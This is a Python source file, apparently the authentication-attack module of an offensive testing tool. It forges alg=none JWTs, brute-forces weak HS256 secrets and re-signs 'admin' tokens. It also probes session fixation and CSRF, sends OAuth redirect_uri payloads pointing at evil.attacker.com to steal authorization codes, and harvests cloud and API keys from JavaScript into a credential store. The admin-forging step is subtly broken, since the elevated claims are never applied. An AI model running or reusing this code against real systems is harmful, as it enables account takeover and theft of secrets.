"""Auth module — JWT attacks, OAuth token theft, session manipulation, API key enumeration."""

from __future__ import annotations

import hashlib
import hmac
import json
import random
import re
import string
from typing import Any, Dict, List, Optional

from sentinel.models import AttackResult, Credential, EngagementSession
from sentinel.logger import log
from sentinel.modules.base import BaseModule
from sentinel.utils.http import request, jwt_parts, b64url_encode, b64url_decode
from sentinel.data import COMMON_JWT_SECRETS, JWT_NONE_ALGOS, OAUTH_ENDPOINTS


def _random_str(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _forge_jwt_none(original: str) -> List[str]:
    """Forge JWT tokens with alg=none variants to bypass signature verification."""
    parsed = jwt_parts(original)
    if not parsed:
        return []
    header, payload, _ = parsed
    forged_tokens = []
    for alg in JWT_NONE_ALGOS:
        header_mod = {**header, "alg": alg}
        h = b64url_encode(json.dumps(header_mod, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        forged_tokens.append(f"{h}.{p}.")
    return forged_tokens


def _forge_jwt_hs256(original: str, secret: str) -> str:
    """Forge a JWT token re-signed with HS256 using the given secret."""
    try:
        parts = jwt_parts(original)
        if not parts:
            return original
        header, payload, _ = parts
        header["alg"] = "HS256"
        h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        return f"{h}.{p}.{b64url_encode(sig)}"
    except Exception:
        return original


class AuthModule(BaseModule):
    """JWT attacks, OAuth token theft, session manipulation, API key enumeration."""

    name = "auth"

    def run(self, es: EngagementSession, **kwargs: object) -> List[AttackResult]:
        jwt_token: str = kwargs.get("jwt_token", "")  # type: ignore[assignment]
        oauth_client_id: str = kwargs.get("oauth_client_id", "")  # type: ignore[assignment]
        oauth_redirect: str = kwargs.get("oauth_redirect", "")  # type: ignore[assignment]

        results: List[AttackResult] = []
        if jwt_token:
            results.extend(self._jwt_attacks(es, jwt_token))
        results.extend(self._session_attacks(es))
        results.extend(self._oauth_attacks(es, oauth_client_id, oauth_redirect))
        results.extend(self._apikey_spray(es))
        return results

    def _jwt_attacks(self, es: EngagementSession, token: str) -> List[AttackResult]:
        results: List[AttackResult] = []
        parsed = jwt_parts(token)
        if not parsed:
            return [AttackResult("auth", "jwt_parse", "ERROR", notes="Invalid JWT format")]

        header, payload, _ = parsed
        log(f"[Auth/JWT] Analyzing token. alg={header.get('alg')} claims={list(payload.keys())}", "INFO")

        # 1. Algorithm None attack
        none_tokens = _forge_jwt_none(token)
        test_url = es.base_url.rstrip("/") + "/api/me"  # common endpoint
        for none_tok in none_tokens:
            resp = request(es, "GET", test_url,
                           headers={**dict(es.headers), "Authorization": f"Bearer {none_tok}"})
            if resp and resp.status_code == 200:
                log(f"[Auth/JWT] NONE ALGORITHM ACCEPTED! alg=none bypass works!", "CRIT")
                results.append(AttackResult(
                    "auth", "jwt_alg_none", "VULN",
                    url=test_url, payload=none_tok[:80],
                    evidence=resp.text[:200], severity="CRITICAL",
                    notes="JWT accepts alg:none — signature verification completely disabled",
                ))
                break

        # 2. Weak secret brute force (HS256)
        if header.get("alg") in ("HS256", "HS384", "HS512"):
            log(f"[Auth/JWT] Brute-forcing HS256 secret...", "INFO")
            found_secret = None
            for secret in COMMON_JWT_SECRETS:
                try:
                    header_b64 = token.split(".")[0]
                    payload_b64 = token.split(".")[1]
                    sig_expected = b64url_decode(token.split(".")[2])
                    computed = hmac.new(
                        secret.encode(),
                        f"{header_b64}.{payload_b64}".encode(),
                        hashlib.sha256
                    ).digest()
                    if hmac.compare_digest(computed, sig_expected):
                        found_secret = secret
                        break
                except Exception:
                    continue
            if found_secret:
                log(f"[Auth/JWT] WEAK SECRET FOUND: '{found_secret}'", "CRIT")
                # Forge admin token
                admin_payload = {**payload, "role": "admin", "is_admin": True,
                                 "user_type": "administrator", "sub": "1"}
                forged = _forge_jwt_hs256(token, found_secret)
                results.append(AttackResult(
                    "auth", "jwt_weak_secret", "VULN",
                    payload=found_secret, evidence=f"Admin token: {forged[:80]}...",
                    severity="CRITICAL",
                    notes=f"JWT signed with weak secret '{found_secret}'. Forge any token.",
                ))
                es.credentials.append(Credential(
                    type="jwt_forged", value={"token": forged, "secret": found_secret},
                    source="jwt_brute_force", notes=f"Forged admin JWT with secret '{found_secret}'",
                ))

        # 3. Algorithm confusion (RS256 -> HS256)
        if header.get("alg") == "RS256":
            log("[Auth/JWT] RS256 detected — attempting alg confusion attack", "INFO")
            # In a real scenario, we'd fetch the public key and re-sign as HS256
            results.append(AttackResult(
                "auth", "jwt_alg_confusion", "PARTIAL",
                evidence="RS256 detected. Fetch public key from /well-known/jwks.json or /oauth/certs then re-sign as HS256.",
                severity="HIGH",
                notes="Algorithm confusion possible if server accepts HS256 signed with RSA public key",
            ))

        # 4. Sensitive data in claims
        sensitive_claim_patterns = ["password", "secret", "key", "token", "cred", "ssn", "credit", "dob"]
        sensitive = {k: v for k, v in payload.items()
                     if any(p in k.lower() for p in sensitive_claim_patterns)}
        if sensitive:
            results.append(AttackResult(
                "auth", "jwt_sensitive_claims", "VULN",
                evidence=str(sensitive), severity="HIGH",
                notes=f"Sensitive data found in JWT payload: {list(sensitive.keys())}",
            ))

        return results

    def _session_attacks(self, es: EngagementSession) -> List[AttackResult]:
        results: List[AttackResult] = []

        # 1. Session fixation
        pre_resp = request(es, "GET", es.base_url)
        if pre_resp:
            session_cookies = {k: v for k, v in pre_resp.cookies.items()
                               if any(s in k.lower() for s in ["session", "sess", "sid", "auth", "token"])}
            if session_cookies:
                # Try fixing a session ID before login
                fixed_session = "CLOUDREAPER_FIXED_" + _random_str(16)
                fixed_cookies = {list(session_cookies.keys())[0]: fixed_session}
                resp2 = request(es, "GET", es.base_url, cookies=fixed_cookies)
                if resp2 and fixed_session in resp2.cookies.values():
                    results.append(AttackResult(
                        "auth", "session_fixation", "VULN",
                        evidence=f"Server accepted fixed session ID: {fixed_session}",
                        severity="HIGH", notes="Session fixation vulnerability detected",
                    ))

        # 2. CSRF token bypass
        csrf_resp = request(es, "GET", es.base_url)
        if csrf_resp:
            csrf_match = re.search(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)', csrf_resp.text, re.I)
            if csrf_match:
                # Test without CSRF token
                for path in ["/api/user", "/api/profile", "/api/settings"]:
                    resp = request(es, "POST", es.base_url.rstrip("/") + path,
                                   json={"test": "csrf"}, headers={"X-Requested-With": "XMLHttpRequest"})
                    if resp and resp.status_code == 200:
                        results.append(AttackResult(
                            "auth", "csrf_bypass", "VULN",
                            url=path, severity="MEDIUM",
                            notes="POST accepted without CSRF token",
                        ))
                        break
        return results

    def _oauth_attacks(self, es: EngagementSession,
                       client_id: str, redirect_uri: str) -> List[AttackResult]:
        results: List[AttackResult] = []
        if not client_id:
            return results

        # 1. Open redirect in redirect_uri
        evil_redirects = [
            "https://evil.attacker.com",
            f"{redirect_uri}@evil.attacker.com",
            f"{redirect_uri}%40evil.attacker.com",
            f"{redirect_uri}/../evil",
            "//evil.attacker.com",
        ]

        for endpoint in OAUTH_ENDPOINTS:
            url = es.base_url.rstrip("/") + endpoint
            for evil_uri in evil_redirects[:3]:
                resp = request(es, "GET", url, params={
                    "response_type": "code",
                    "client_id": client_id,
                    "redirect_uri": evil_uri,
                })
                if resp and resp.status_code in (301, 302):
                    location = resp.headers.get("Location", "")
                    if "evil.attacker.com" in location or evil_uri.split("//")[-1].split("/")[0] in location:
                        results.append(AttackResult(
                            "auth", "oauth_redirect_bypass", "VULN",
                            url=url, payload=f"redirect_uri={evil_uri}",
                            evidence=f"Redirected to: {location}",
                            severity="CRITICAL",
                            notes="OAuth redirect_uri not properly validated — token theft possible",
                        ))
                        log(f"[Auth/OAuth] Open redirect! Code will be sent to evil.attacker.com", "CRIT")

        # 2. State parameter missing (CSRF on OAuth)
        for endpoint in OAUTH_ENDPOINTS:
            url = es.base_url.rstrip("/") + endpoint
            resp = request(es, "GET", url, params={
                "response_type": "code", "client_id": client_id, "redirect_uri": redirect_uri,
            })
            if resp and resp.status_code in (200, 302):
                location = resp.headers.get("Location", "")
                if "state=" not in location and "state=" not in resp.url:
                    results.append(AttackResult(
                        "auth", "oauth_missing_state", "VULN",
                        url=url, evidence="No state parameter in OAuth flow",
                        severity="HIGH", notes="OAuth flow lacks state param — CSRF attack possible",
                    ))
                    break
        return results

    def _apikey_spray(self, es: EngagementSession) -> List[AttackResult]:
        results: List[AttackResult] = []
        # Test if API key leakage in JS files
        js_resp = request(es, "GET", es.base_url)
        if not js_resp:
            return results

        # Find JS files referenced
        js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', js_resp.text)
        for js_path in js_urls[:5]:
            if not js_path.startswith("http"):
                js_path = es.base_url.rstrip("/") + ("/" if not js_path.startswith("/") else "") + js_path
            js_content_resp = request(es, "GET", js_path)
            if js_content_resp:
                content = js_content_resp.text
                for pattern_re, label in [
                    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
                    (r"AIza[0-9A-Za-z\-_]{35}", "Google API Key"),
                    (r"ghp_[0-9a-zA-Z]{36}", "GitHub PAT"),
                    (r"sk-[a-zA-Z0-9]{48}", "OpenAI API Key"),
                    (r'api[_-]?key["\s]*[:=]["\s]*["\']([a-zA-Z0-9\-_]{20,})["\']', "Generic API Key"),
                    (r'(?:secret|password|token)["\s]*[:=]["\s]*["\']([^\s"\']{8,})["\']', "Secret/Token"),
                ]:
                    matches = re.findall(pattern_re, content, re.I)
                    for m in matches[:3]:
                        val = m if isinstance(m, str) else m[0]
                        log(f"[Auth] Secret in JS! type={label} value={val[:20]}...", "CRIT")
                        es.credentials.append(Credential(
                            type=label.lower().replace(" ", "_"),
                            value={"key": val}, source=f"javascript:{js_path}",
                            notes=f"{label} exposed in client-side JS",
                        ))
                        results.append(AttackResult(
                            "auth", "js_secret_leak", "VULN",
                            url=js_path, evidence=f"{label}: {val[:20]}...",
                            severity="CRITICAL",
                            notes=f"{label} exposed in JavaScript source",
                        ))
        return results
